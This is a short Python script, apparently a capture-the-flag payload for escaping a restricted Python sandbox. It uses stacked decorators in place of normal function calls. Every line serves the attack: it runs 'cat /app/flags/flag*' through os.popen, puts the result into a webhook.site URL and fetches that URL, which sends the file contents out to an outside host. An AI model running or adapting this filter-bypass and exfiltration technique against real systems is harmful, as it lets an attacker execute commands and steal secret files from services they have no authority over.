from os import popen
from urllib.request import urlopen

token = "TomorinIsCuteAndILovePython" 
url = "https://webhook.site/111d99e4-8095-4b6a-bf04-e4a79209bce2/?flag="

cmd2 = lambda a: "cat /app/flags/flag*"
func2 = lambda f: [x[:-1] for x in f][0]

@func2
@popen
@cmd2
class flag:pass

flagurl = url + flag
urls = lambda f: flagurl

@urlopen
@urls
class requestf:pass